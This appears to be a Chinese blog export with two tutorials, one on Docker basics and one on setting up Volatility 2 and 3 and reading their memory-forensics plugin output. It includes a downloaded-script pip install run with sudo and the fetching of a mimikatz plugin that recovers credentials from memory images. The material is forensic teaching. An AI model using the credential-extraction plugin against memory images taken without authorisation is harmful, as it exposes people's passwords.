执行此命令后，systemd会创建必要的符号链接，确保下次系统启动时，Docker服务会自动启动\n这是一个一次性的设置，之后无需再手动启动\n禁止开机自启动 取消一个服务的开机自启动设置\nsystemctl disable 服务名称 eg：\nsystemctl disable docker 此命令会移除enable命令创建的符号链接，下次系统重启后，Docker服务将不会自动运行\n这并不会影响当前正在运行的服务状态\n检查服务是否开机自启动 查看一个服务当前是否被设置为开机自启动\nsystemctl is-enabled 服务名称 eg：\nsystemctl is-enabled docker 此命令会返回 enabled (已设置) 或 disabled (未设置)\nDocker更改源 不知道为什么国内忽然无法访问官方的镜像仓库了，为了加快Docker镜像的下载速度，我们通常需要将 Docker的默认源registry.docker.io更换为国内的镜像加速源\n检查安装状态 首先要确认你的系统已正确安装了Docker，可以执行：\ndocker --version 返回的是docker版本，确认无误后继续\n编辑配置文件 Docker 的镜像源配置文件通常位于/etc/docker/daemon.json，如果文件不存在，可以手动创建\n使用任意文本编辑器打开，例如使用vim（不知道怎么使用vim的可以看一眼：vim使用教程 ）：\nvim /etc/docker/daemon.json 然后将内容修改为以下格式：\n{ \u0026#34;registry-mirrors\u0026#34;: [ \u0026#34;https://\u0026lt;加速地址1\u0026gt;\u0026#34;, \u0026#34;https://\u0026lt;加速地址2\u0026gt;\u0026#34; ] } 当然你还能添加更多加速地址，但是注意最后一个加速地址后面就不能有逗号了\nb站up:大海资源整理的当前可用的国内镜像源：https://www.dhzy.fun/archives/6852.html\n重启服务 修改完配置后，需要重启 Docker 服务以使配置生效：\nsystemctl restart docker 验证是否生效 可以执行如下命令查看当前镜像加速器配置是否生效：\ndocker info | grep -A 10 \u0026#34;Registry Mirrors\u0026#34; 从输出中查找包含Registry Mirrors的那一行，并显示它后面10行\n如果是下面这样的输出，说明配置成功了：\n注意事项 修改配置文件时要确保JSON格式正确，例如逗号不能多不能少\n有些加速源如阿里云需要登录账号并绑定使用，获取专属地址\n如果使用的是非systemd系统，要使用service命令重启Docker\nDocker使用 镜像管理 查找镜像 docker search \u0026lt;镜像名称\u0026gt; docker search使用的是DockerHub的HTTP API，没有镜像源概念，无法走国内加速\n如果无法访问，必须使用代理，或者通过别的方式访问官网：https://hub.docker.com/\n拉取镜像 从仓库中下载一个镜像到你的本地机器\ndocker pull \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 镜像名称：想要下载的软件，例如nginx\n标签 ：通常用来表示软件的版本，例如latest表示最新版，1.21表示特定版本\n​ 如果省略标签，Docker 会默认使用latest\neg：\ndocker pull nginx:latest 此命令会从镜像源下载最新版本的Nginx镜像\n查看本地镜像 列出所有已经下载到本地计算机上的镜像\ndocker images REPOSITORY：仓库名\nTAG ：标签\nIMAGE ID：镜像的唯一ID\nCREATED：创建时间\nSIZE：镜像大小\n保存更改的镜像 docker commit [选项] \u0026lt;容器ID\u0026gt;/\u0026lt;容器名称\u0026gt; \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 常用选项：\n-m \u0026quot;提交信息\u0026quot;：为此次操作添加描述性说明\n类似于 Git 的 commit message，便于记录修改内容\n-a \u0026quot;作者\u0026quot;：指定作者信息\n方便追踪是谁进行了修改或创建操作\neg：\ndocker commit -m=\u0026#34;update\u0026#34; -a=\u0026#34;kakahuote\u0026#34; 8950b5741b30 mynginx:mod 这个命令会执行以下操作：\n把名为8950b5741b30的容器保存为一个新的镜像 添加说明信息\u0026quot;update\u0026quot;，记录镜像的更改内容 指定作者为kakahuote 创建一个名为mynginx、标签为mod的新镜像 删除镜像 当某个镜像不再需要时，可以将其从本地删除以释放磁盘空间\ndocker rmi \u0026lt;镜像ID\u0026gt;/\u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 只能删除没有被任何容器（包括已停止的容器）使用的镜像\n如果需要删除一个被使用的镜像，必须先删除所有依赖它的容器\n也可以使用-f选项强制删除，但这可能会导致依赖该镜像的容器无法再次启动或者其他未知错误，慎用！\n如果不指定标签，默认删除的会是latest标签，如果没有latest则会报错，所以建议指定标签删除\neg：\ndocker rmi mynginx:mod 容器管理 创建并运行容器 docker run [选项] \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; 常用选项：\n--name：为容器指定一个自定义的名称\n如果省略，Docker会自动生成一个随机名称\n-d：以分离模式在后台运行容器\n这对于运行像Web服务器这样的长期服务很重要，否则容器会占据你的终端进行输出和报错等行为\n-P(大写)：将容器内部所有暴露的端口随机映射到主机的空闲端口上\n-p(小写)：指定端口映射，其常用格式如下：\n主机端口:容器端口\ndocker run -d -p 8080:80 nginx 此命令将主机的8080端口映射到容器的80端口\n\u0026lt;IP地址\u0026gt;:主机端口:容器端口\n指定只将主机的特定IP地址的端口映射到容器\ndocker run -d -p 127.0.0.1:8081:80 nginx 此命令将主机127.0.0.1这个回环地址的8081端口映射到容器的80端口\n这样，只有在本机才能通过127.0.0.1:8081访问，来自外部网络的访问会被拒绝\n主机端口:\u0026lt;容器端口/协议\n默认情况下，端口映射使用的是TCP协议，也可以显式指定UDP协议\nPdocker run -d -p 8082:53/udp nginx 此命令将主机的8082端口映射到nginx容器的53UDP端口\n--rm：使容器在停止后被自动删除\n适合用于测试和运行一次性任务\neg：\ndocker run --name my-nginx -d -p 8080:80 nginx 这个命令会执行以下操作：\n检查本地是否存在nginx:latest镜像，如果不存在，会自动拉取\n基于此镜像创建一个名为 my-nginx 的容器\n-d：让这个容器在后台持续运行\n-p 8080:80：将你本机的8080端口的流量转发到容器内部的80端口（Nginx默认在80端口监听）\n命令执行后，在浏览器中访问http://你的主机IP地址:8080或http://localhost:8080\n如果看到Nginx的欢迎页面，则表示容器已成功运行\n查看正在运行的容器 docker ps CONTAINER ID：容器的唯一标识，可以用全部或者前几位操作该容器，只要能唯一识别\nIMAGE：使用的镜像\nCOMMAND：容器启动时运行的命令\nCREATED：容器创建的时间\nSTATUS：容器状态，这里的字段值是UP，说明是一个正在运行的容器\nPORTS：端口映射\n0.0.0.0:8080-\u0026gt;80/tcp：主机所有IPv4地址的8080端口被映射到容器内部的80端口（TCP 协议）\n:::8080-\u0026gt;80/tcp：主机所有IPv6地址的8080端口也映射到容器内部的80端口（TCP 协议）\nNAMES：自定义的容器的名字\n查看所有容器 docker ps -a -a是all的缩写，代表列出所有容器，包括那些已经停止运行的\n这个命令可以找到旧的、已停止的容器，以便重新启动它们或将它们删除以进行清理\n这里的STATUS字段是exited，说明这是一个退出的、不在运行的容器\n停止容器 docker stop \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 说明: 此命令会向容器内的主进程发送一个 SIGTERM 信号，请求其正常关闭。应用程序会接收到这个信号并执行关闭前的清理工作。\neg：\ndocker stop nginx 停止后，容器不在运行列表之中\n启动一个已停止的容器 docker start \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 这个命令会使一个处于Exited状态的容器恢复到Up状态，容器会保留其上次停止时的所有配置和数据。\n示例: docker start my-nginx\n删除容器 docker rm \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 默认情况下，不能删除一个正在运行的容器，必须先使用docker stop将其停止\n如果确定要删除一个运行中的容器，可以添加-f参数来强制执行\n容器信息查看与交互 查看端口映射 此命令可以快捷地查看一个容器的端口映射情况\ndocker port \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; eg：\ndocker port nginx 容器内部的80端口被映射到了：\n0.0.0.0:8080：表示主机的所有IPv4地址上的8080端口 [::]:8080：表示主机的所有IPv6地址上的8080端口 也就是说，我们可以使用以下任意方式访问这个容器内的Nginx服务：\nhttp://localhost:8080 http://127.0.0.1:8080 http://\u0026lt;主机的IP\u0026gt;:8080 如果启用了IPv6网络，还可以使用IPv6地址访问，如http://[::1]:8080 查看容器日志 docker logs [选项] \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; 常用选项：\n-f：持续跟踪并输出日志\n--tail：仅显示日志的最后N行\neg：\ndocker logs nginx 在容器内部执行命令 可以在一个运行中的容器内执行命令，而不进入其交互式Shell\ndocker exec \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; \u0026lt;命令\u0026gt; eg：\ndocker exec nginx ls -l 此命令会在名为nginx的容器内部执行ls -l 命令，并返回结果，而我们的终端仍然停留在主机上\n进入容器的交互式终端 对于更复杂的调试，我们就需要一个完整的Shell环境来在容器内部进行操作\ndocker exec -it \u0026lt;容器名称\u0026gt;/\u0026lt;容器ID\u0026gt; /bin/bash -it是两个选项的组合：\n-i保持标准输入开启，-t分配一个伪终端，这共同创建了一个可以交互的命令行界面\n/bin/bash是一个常见的Shell程序，有些镜像可能提供的是/bin/sh，比较不好用\n也可以在创建容器的时候就进入其交互式终端：\ndocker run -it \u0026lt;镜像名称\u0026gt;:\u0026lt;标签\u0026gt; /bin/bash eg：\ndocker exec -it nginx /bin/bash 执行后命令提示符改变，表示已经进入了容器，可以像在普通Linux环境中一样运行命令\n如果想要退出，可以使用Ctrl+D，或者输入exit\n容器网络与连接 除了端口映射，Docker还提供了强大的网络功能，允许容器之间方便、安全地互相通信\n在开始之前，我们需要知道docker的网络类型有哪些\n网络类型 bridge bridge是Docker默认的网络类型，适用于单个主机上容器之间的通信\n每个容器会获得一个虚拟网卡和私有IP地址 容器之间可以通过容器名通信 可以使用-p参数将容器端口映射到宿主机端口，实现外部访问 默认的bridge网络名称就是bridge 适用于需要隔离、但仍允许访问外部网络的容器场景\nhost 容器与宿主机共享网络栈，不做任何隔离\n容器没有自己的IP地址 使用宿主机的IP和端口 性能更好，网络开销低 容器中暴露的端口不需要通过-p映射 适用于对网络性能要求极高的场景\nnone 容器没有网络连接\n没有分配IP地址 不能访问外部网络，也不能与其他容器通信 除非手动配置网络，否则容器完全断网 适用于需要自定义网络配置或完全隔离网络的场景\noverlay 用于Docker Swarm集群环境中，支持多主机容器通信\n可跨宿主机连接容器 基于VXLAN技术封装 需要Swarm模式支持 适用于需要将多个 Docker 主机上的容器连接成一个网络的分布式应用\nmacvlan 让容器像宿主机一样，直接拥有局域网内的独立IP\n容器像物理主机一样直接连接到物理网络 容器具有独立MAC和IP地址 可被局域网中的其他设备直接访问 适用于容器需要与局域网设备完全对等通信的场景，例如作为局域网服务节点\ncontainer 多个容器共享同一个网络命名空间，通过--network container:\u0026lt;容器名\u0026gt;实现\n使用另一个容器的网络配置 容器之间通过进程间通信 适用于容器需要共享网络堆栈（如日志、监控）的情况\n查看当前已创建的网络 docker network ls NETWORK ID：网络的唯一标识\nNAME：网络名称\nDRIVER：网络类型\nSCOPE：作用范围，通常是local(本地网络)或swarm(集群网络)\n创建自定义网络 docker network create -d bridge \u0026lt;网络名称\u0026gt; -d：指定网络类型。对于单机环境，bridge是最常用的类型 eg：\ndocker network create -d bridge my-net 删除已定义的网络 docker network rm \u0026lt;网络名\u0026gt;/\u0026lt;网络ID\u0026gt; eg：\ndocker network rm my-net 连接容器到网络 我们可以在启动容器时使用--network选项将其连接到指定的网络\ndocker run -d --name \u0026lt;容器名称\u0026gt; --network \u0026lt;网络名称\u0026gt; \u0026lt;镜像名称\u0026gt; eg：\n我们创建两个容器并都连接到my-net网络\n首先创建第一个容器 nginx-1：\ndocker run -d --name nginx-1 --network my-net nginx 然后创建第二个容器 nginx-2：\ndocker run -d --name nginx-2 --network my-net nginx 容器间通信 当多个容器连接到同一个自定义网络时，它们可以通过容器名称作为主机名直接互相访问\n我们可以进入一个容器来测试与另一个容器的连通性\neg：\n进入nginx-1容器，然后ping nginx-2\ndocker exec -it nginx-1 /bin/bash 进入容器后，由于nginx镜像默认没有 ping 工具，我们需要先安装它：\napt-get update \u0026amp;\u0026amp; apt-get install -y iputils-ping 安装完成后，执行ping：\nping nginx-2 可以看到，nginx-1能够成功解析nginx-2的名称并与之通信，这证明了容器间的互联已经建立shell\n查看容器网络信息 docker inspect \u0026lt;对象ID或名称\u0026gt; docker inspect是一个非常强大的命令，用于查看容器、镜像、网络、卷等对象的详细底层信息\n它会返回一段JSON 格式的数据，包含几乎所有属性，比如网络配置、挂载卷、环境变量、启动命令等\n这里我们查看容器的信息，并过滤网络部分：\ndocker inspect \u0026lt;容器ID\u0026gt;/\u0026lt;名称\u0026gt; | grep -A 10 \u0026#34;NetworkSettings\u0026#34; DNS配置 全局配置 我们可以为所有Docker容器配置默认的DNS服务器\n这需要在Docker的守护进程配置文件/etc/docker/daemon.json中添加dns字段\n{ \u0026#34;dns\u0026#34;: [ \u0026#34;114.114.114.114\u0026#34;, \u0026#34;8.8.8.8\u0026#34; ] } 修改此文件后，必须重启 Docker 服务才能生效\n容器独立配置 如果只想为某个特定的容器指定 DNS，可以在docker run时使用相关选项\ndocker run [DNS选项] \u0026lt;镜像名称\u0026gt; 常用DNS选项：\n--dns=\u0026lt;IP地址\u0026gt;：指定容器使用的DNS服务器地址 --dns-search=\u0026lt;域名\u0026gt;：指定DNS搜索域。当查找一个短主机名时，会自动追加这个域名进行尝试 --hostname=\u0026lt;主机名\u0026gt;：设置容器内部的主机名 eg：\ndocker run -it --rm --hostname=myhost --dns=114.114.114.114 nginx 这个命令会启动一个临时的nginx容器，其主机名为myhost，使用114.114.114.114作为DNS服务器\n常用DNS服务器 阿里云公共 DNS\n223.5.5.5 223.6.6.6 114 DNS（国内知名公共 DNS）\n114.114.114.114 114.114.115.115 Google 公共 DNS\n8.8.8.8 8.8.4.4 Cloudflare DNS\n1.1.1.1 1.0.0.1 OpenDNS\n208.67.222.222 208.67.220.220 Docker实例安装 各种镜像安装过程都大差不差，这里以nginx为例，其他的也能作参考\n查看可用版本 访问Nginx镜像库地址 https://hub.docker.com/_/nginx?tab=tags 可以copy的字段是拉取当前版本镜像的命令，下面是一些介绍：\n字段 含义 Digest 每个平台构建出的镜像唯一标识符 OS/ARCH 表示支持的操作系统和架构 Vulnerabilities 镜像中检测出的安全漏洞数量\n分等级：严重（红）、高（橙）、中（黄）、低（灰） Compressed size 镜像下载时的压缩大小 使用命令查看 docker search nginx 我们一般都使用最新的，也就是latest\n拉取最新镜像 docker pull nginx:latest 查看是否拉取成功 docker images 运行容器 docker run --name nginx -p 8080:80 -d nginx 参数说明：\n\u0026ndash;name nginx：容器名称改成nginx -p 8080:80： 端口进行映射，将本地8080端口映射到容器内部的80端口 -d：设置容器在在后台一直运行 测试访问 http://localhost:8080 ","date":"2025-07-23T19:24:02+08:00","image":"http://picture.928330.xyz/typora/docker.jpg","permalink":"https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8Bdocker/","title":"快速上手docker"},{"content":"前置步骤/问题解决 下载 Volatility2：https://github.com/volatilityfoundation/volatility\nVolatility3：https://github.com/volatilityfoundation/volatility3\npython版本 update-alternatives是Debian/Ubuntu系统提供的管理系统级默认命令的工具，通过维护符号链接工作\n设置优先级，一般使用整数：\nupdate-alternatives --install /usr/bin/python python /usr/bin/python2 100 update-alternatives --install /usr/bin/python python /usr/bin/python3 150 查看当前可识别的版本：\nupdate-alternatives --list python /usr/bin/python2 /usr/bin/python3 /usr/bin/python3.11 切换版本：\nupdate-alternatives --config python 有 3 个候选项可用于替换 python (提供 /usr/bin/python)。 选择 路径 优先级 状态 ------------------------------------------------------------ 0 /usr/bin/python3 150 自动模式 * 1 /usr/bin/python2 100 手动模式 2 /usr/bin/python3 150 手动模式 3 /usr/bin/python3.11 125 手动模式 要维持当前值[*]请按\u0026lt;回车键\u0026gt;，或者键入选择的编号： 输入数字切换版本\n虚拟环境 安装 volatility2是基于python2开发的，所以虚拟环境也要使用python2的virtualenv创建\n这里以我下载python2.7版本的虚拟环境步骤为例，记录一些遇到的问题\n首先下载pip2，需要切换到python2的环境，并且由于linux系统大多放弃了apt对python2的支持，所以无法使用apt install下载，需要手动安装\n1.下载脚本：\ncurl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py 2.运行脚本：\nsudo python2 get-pip.py 3.检查是否安装成功：\npip2 -V 成功显示出pip的版本号，以及它关联的是Python 2.7，就说明已经成功为安装好了pip2\n4.安装virtualenv：\n安装的版本必须是兼容python2的，直接安装可能会下载到python3的版本，所以要指定版本：\npip2 install \u0026#34;virtualenv\u0026lt;20\u0026#34; 如果是volatility3，也就是基于python3的版本，就可以使用apt直接下载对应的venv工具\n先更新，后下载：\nsudo apt update apt install python3-venv 这样就完成了安装\n创建 python2：\npython2 -m virtualenv 虚拟环境名 python3：\npython3 -m venv 虚拟环境名 使用 source 虚拟环境名/bin/activate 提示符前面会多一个(虚拟环境名)的标记，之后的所有python和pip命令都只作用在此环境下\n分享依赖 这条命令会将当前环境中所有已安装的库及其版本号写入到requirements.txt中：\npip freeze \u0026gt; requirements.txt 如果别人需要用，只需创建一个新的虚拟环境，再运行：\npip install -r requirements.txt 通常我们也是使用这个命令来下载对应工具需要的依赖\n退出 deactivate 删除 rm -rf 虚拟环境名 设置为系统级命令 编写启动脚本 vim /usr/local/bin/vol 向里面写入下面内容：\n#!/bin/bash source /home/kali/volatility2/venv_volatility2/bin/activate \u0026amp;\u0026amp; python /home/kali/volatility2/vol.py \u0026#34;$@\u0026#34; \u0026amp;\u0026amp;的意思是：如果前一个命令成功，则执行后一个命令\n前者是启动虚拟环境，要写对应创建的虚拟环境路径\n后者是把所有参数传递给volatility脚本，要写对应的vol.py路径\n给脚本添加启动权限 sudo chmod +x /usr/local/bin/vol 这样就设置完成了，如果不行，就刷新一下命令缓存再运行：\nhash -r 报错解决 缺少运行库 换了两个虚拟机，每次运行volatility2的时候都会遇到库pycryptodome和distorm3不存在的问题\n这种情况只要进入对应虚拟环境，然后安装缺少的库即可\nsource /home/kali/volatility2/venv_volatility2/bin/activate pip2 install pycryptodome pip2 install distorm3 deactivate 安装插件 volatility2历史悠久，社区也很强大，很多人开发了非常好用的插件，需要我们手动安装\n这里以mimikatz插件为例，具体的下载地址网上一搜就有\n下载插件，这里使用wget，其他方式随意：\nwget https://raw.githubusercontent.com/volatilityfoundation/community/master/FrancescoPicasso/mimikatz.py 移动到存放插件的目录，一般是volatility2/volatility/plugins/：\nmv mimikatz.py /home/kali/volatility2/volatility/plugins/ 之后就可以使用了，不过mimikatz使用还需要安装依赖，具体看mimikatz Volatility常用命令 系统画像 查看系统信息（imageinfo/info） Volatility2 这是vol2进行任何分析前必须执行的第一步，用于确定操作系统的Profile，即版本\nvol2 -f \u0026lt;内存镜像\u0026gt; imageinfo \u0026lt;内存镜像\u0026gt;的后缀名没有固定的，可能是raw，dump，img，vmem等等\nSuggested Profile(s)：建议的配置文件\n在后续执行所有其他插件时，都需要通过 --profile=\u0026lt;profile_name\u0026gt; 参数从这个列表中选择一个来使用\n通常，选择列表中的第一个（Win7SP1x64）就是最合适的\nKDBG：内核调试块地址\n用于定位其他所有系统信息，如进程列表、驱动列表等\nImage date and time：镜像日期和时间，世界标准时间零时区UTC＋0\n这里表明内存快照是在UTC时间2019年12月20日03:47:57被创建\nImage local date and time：原始机器当时的本地时间，包含时区信息\n03:47:57加上5小时30分钟，正好等于09:17:57，这就是当地的时间\nNumber of Processors：处理器数量\n这里显示该系统是单核处理器\nVolatility3 V3会自动检测Profile，之后的命令无需手动输入，此命令用于显示详细的信息\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.info.Info NTBuildLab：Windows操作系统构建版本标签\n7601.17514.amd64fre.win7sp1_rtm，代表一个经过后续更新（修订号17514）的、面向64位amd架构的、已正式发布的、基于Windows7SP1开发分支的操作系统\nKeNumberProcessors：处理器个数\nSystemTime：内存快照被制作的时间，世界标准时间零时区UTC＋0\nNtProductType： Windows操作系统的产品类型\nNtProductWinNt：客户端版本\nNtProductServer：服务器\nNtProductLanManNt：域控制器，是特定类型的服务器\nNtMajorVersion / NtMinorVersion：Windows操作系统内核的主版本号和次版本号\n6.1在WindowsNT内核版本中，对应着Windows7或WindowsServer2008R2\nPE TimeDateStamp：系统内核文件被编译的时间\n查看文件信息（mftparser/mftscan） 除了Volatility，还可以使用其他工具导出mft记录：https://github.com/jschicht/Mft2Csv/releases\n下载打开软件，选择$MFT文件，然后导出到csv文件即可，导出的条目会以csv文件的形式存放在软件目录下\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; mftparser MFT entry found at offset \u0026hellip;：该MFT记录在内存中的物理偏移地址\nAttribute:In Use \u0026amp; File：表明这是一条活动的、描述文件的记录\nRecord Number：该记录在MFT中的唯一编号\nLink count：指向这个文件实体的文件名数量（硬链接数）\n$STANDARD_INFORMATION：主属性，只有当文件内容被编辑时，其Modified和Updated时间才会改变\n$FILE_NAME：文件名属性，文件内容被改动、重命名、移动时，其Modified和Updated时间都会改变\nCreation：创建时间\nModified：修改时间\nMFT Altered：MFT记录本身最后一次被修改的时间，例如文件名或权限变更\nAccess Date：文件内容最后一次被访问的时间（注意：在现代Windows系统中，为提高性能，这个时间戳不一定总是实时更新）\nName/Path：显示具体的文件名\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.mftscan.MFTScan Offset ：偏移量\n这是该 MFT 记录在内存中的虚拟地址\nRecord Type：记录类型\n指明该记录是用于一个文件（FILE）还是一个目录（Directory）\nRecord Number：记录编号\n这是该文件/目录在整个 MFT 中的唯一索引号\nLink Count：链接计数\n表示有多少个文件名指向这个相同的文件实体\n例如，值为2意味着这个文件有两个名字，通常一个是长文件名，一个是8.3格式的短文件名\nMFT Type：MFT类型\n进一步描述MFT条目的类型，通常与Record Type一致\nPermissions：权限属性\n显示文件的属性，如 Archive (存档)、System (系统文件)等\nAttribute Type：属性类型\n指明当前这一行显示的是 MFT 记录中的哪一种具体属性\nSTANDARD_INFORMATION：主属性，只有当文件内容被编辑时，其Modified和Updated时间才会改变\nFILE_NAME：文件名属性，文件内容被改动、重命名、移动时，其Modified和Updated时间都会改变\n最前面带星号的行是隶属于它上面那个不带星号的主记录的子属性\nCreated, Modified, Updated, Accessed：四种时间戳\n分别代表了该属性（STANDARD_INFORMATION 或 FILE_NAME）的：\n创建时间、修改时间、MFT记录更新时间、访问时间（以UTC标准时间显示）\nFilename：文件名\n当 Attribute Type 为 FILE_NAME 时，这一列会显示具体的文件名\n查看windows服务（svcscan） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; svcscan Service Name：服务的内部名称\nDisplay Name：服务的显示名称，在服务管理器中的名称\nProcess ID：该服务的进程的ID\nService State： 服务状态，表明服务是RUNNING(正在运行) 还是STOPPED(已停止)\nBinary Path：服务路径\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.svcscan.SvcScan Offset：偏移量\n这是该服务记录在内存中的虚拟地址\nOrder：顺序\n服务在其服务组内的加载顺序编号\nPID：进程ID\n如果该服务当前正在运行，这里会显示托管它的进程的ID，如果服务已停止，则显示为 N/A\nStart：启动类型\n这是在注册表中为该服务配置的启动方式，决定了它如何被启动，有下面几种：\nSERVICE_BOOT_START：引导启动\nSERVICE_SYSTEM_START：系统启动\nSERVICE_AUTO_START：自动启动\nSERVICE_DEMAND_START：按需启动 (手动)\nSERVICE_DISABLED：已禁用\nState：当前状态\n表示在捕获内存时该服务的实时状态，有下面这几种：\nSERVICE_STOPPED：服务已停止\nSERVICE_START_PENDING：服务正在启动\nSERVICE_STOP_PENDING：服务正在停止\nSERVICE_RUNNING：服务正在运行\nSERVICE_CONTINUE_PENDING：服务即将继续\nSERVICE_PAUSE_PENDING：服务即将暂停\nSERVICE_PAUSED：服务已暂停\nType：服务类型\n描述了该服务的性质，有下面几种：\nSERVICE_KERNEL_DRIVER：内核模式驱动程序\nSERVICE_FILE_SYSTEM_DRIVER：文件系统驱动程序\nSERVICE_WIN32_OWN_PROCESS：独立进程Win32服务\nSERVICE_WIN32_SHARE_PROCESS：共享进程Win32服务\nSERVICE_INTERACTIVE_PROCESS：交互式服务，由于安全原因，这个服务已经被弃用\nName：服务名\n服务的短名称或内部名称\nDisplay：显示名称\nWindows服务管理器中看到的人类可读的名称\nBinary：二进制/运行命令\n这是启动该服务进程时实际使用的命令行\n对于共享服务，这里通常会包含-k \u0026lt;服务组名\u0026gt;参数，例如C:\\Windows\\system32\\svchost.exe -k DcomLaunch\nBinary (Registry)：注册表中的二进制路径\n这是在注册表中为该服务配置的ImagePath值\nDll：服务DLL\n如果该服务是由一个DLL实现并由svchost.exe托管的，这里会显示该 DLL 的路径\n查看驱动模块（modules/driverscan/modscan） Volatility2 使用modules来查看驱动模块，通过遍历内核中的PsLoadedModuleList官方链表来获取信息：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; modules Offset(V)：该模块的_LDR_DATA_TABLE_ENTRY结构在内存中的虚拟地址 Name：模块的名称，例如 ntoskrnl.exe Base：模块被加载到内存中的基地址 Size：模块在内存中所占空间的大小 File：该模块对应的磁盘文件路径 或者也可以使用driverscan通过扫描内存池来寻找驱动对象，这种方式能发现一部分隐藏的驱动对象：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; driverscan Offset(P)：该驱动对象在内存中的物理地址 #Ptr：指向该驱动对象的指针数量 #Hnd：该驱动对象的句柄数量 Start：驱动程序在内存中的起始地址 Size：驱动程序在内存中所占空间的大小 Service Key：该驱动在注册表服务项中的名称，这通常与驱动名相同 Name：驱动的名称 Driver Name：驱动对象在系统中的完整名称，通常以\\Driver\\或\\FileSystem\\开头 还可以使用modscan扫描模块结构特征寻找驱动，最全面，能发现大多数隐藏模块速度慢，但可能有误报：\nvol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; modscan 物理地址不同是正常的，因为它们扫描和定位的目标数据结构不同\nVolatility3 使用modules：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.modules.Modules 使用driverscan：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.driverscan.DriverScan 使用modscan：\nvol3 -f \u0026lt;内存镜像\u0026gt; windows.modscan.ModScan 查看驱动程序的IRP（driverirp） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; driverirp DriverName：目标驱动的名称\n第一列：IRP功能码的编号\n第二列：IRP功能码的名称，描述了I/O请求的类型，例如：\nIRP_MJ_CREATE：当有程序尝试创建或打开文件时，会产生这个请求 IRP_MJ_READ：读取文件请求 IRP_MJ_WRITE：写入文件请求 IRP_MJ_DEVICE_CONTROL：设备控制请求 第三列：处理该IRP请求的函数在内存中的实际地址\n第四列：该函数地址所属的内核模块\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.driverirp.DriverIrp Offset：该驱动对象在内存中的虚拟地址 Driver Name：驱动对象的名称 IRP：IRP的主要功能码，代表了驱动程序注册要处理的I/O操作类型，例如： IRP_MJ_CREATE：文件或设备创建/打开请求 IRP_MJ_CLOSE：文件或设备关闭请求 IRP_MJ_READ：读取请求 IRP_MJ_WRITE：写入请求 IRP_MJ_DEVICE_CONTROL：设备控制请求，是驱动程序功能的主要入口 IRP_MJ_INTERNAL_DEVICE_CONTROL：内部设备控制请求 IRP_MJ_PNP：即插即用相关的请求 Address：处理该类型IRP请求的函数在内存中的实际地址 Module：该函数地址所属的内核模块（驱动文件） Symbol：具体的函数名 查看内核回调（callbacks） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; callbacks Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.callbacks.Callbacks Type：回调类型\n当这类事件发生时，内核会调用所有注册在此的回调函数，例如：\nPspCreateProcessNotifyRoutine: 当一个新进程被创建时触发 PspLoadImageNotifyRoutine: 当一个可执行文件或DLL被加载到内存时触发 KeBugCheckCallbackListHead: 当系统发生蓝屏崩溃时触发 Callback：回调函数地址\nModule：所属模块\n它指明了这个回调函数属于哪个内核模块，即驱动程序\n在正常情况下，这里应该都是ntoskrnl（内核自身）或已知的、合法的硬件驱动程序（如tcpip,ndis等）\nSymbol：回调函数的具体名称\nDetail：补充说明\n查看系统调用（ssdt） Volatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;系统版本\u0026gt; ssdt Entry：SSDT 表中的索引号（入口点编号），以十六进制表示 Address：该索引号对应的内核函数在内存中的实际地址 owned by：指明了这个函数地址属于哪个内核模块 如果一个函数的Owner不是 ntoskrnl.exe或win32k.sys，而是另一个可疑的驱动，或者显示为 (unknown)，就意味着该函数很可能已被挂钩（Hook），指向了恶意的函数\nVolatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.ssdt.SSDT Index：SSDT 表中的索引号（入口点编号） Address：该索引号对应的内核函数在内存中的实际地址 Module：指明了这个函数地址属于哪个内核模块 Symbol：该内核函数的具体名称 查看符号链接（symlinkscan） 通过扫描内存以寻找并打印出_OBJECT_SYMBOLIC_LINK结构，列出系统内核中存在的符号链接及其指向的目标\nVolatility2 vol2 -f \u0026lt;内存镜像\u0026gt; --profile=\u0026lt;配置文件\u0026gt; symlinkscan 输出字段详解 Offset(P)：该符号链接对象（_OBJECT_SYMBOLIC_LINK 结构）在内存中的物理地址 #Ptr：指向该符号链接对象的指针数量 #Hnd：该符号链接对象的句柄数量 Creation time：该符号链接被创建的时间戳（以UTC标准时间显示） From：这是符号链接自身的名称，可以理解为“快捷方式”的名字 To：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径 Volatility3 vol3 -f \u0026lt;内存镜像\u0026gt; windows.symlinkscan.SymlinkScan Offset：该符号链接对象（_OBJECT_SYMBOLIC_LINK 结构）在内存中的虚拟地址 CreateTime：该符号链接被创建的时间戳（以UTC标准时间显示） From Name：这是符号链接自身的名称，可以理解为“快捷方式”的名字 To 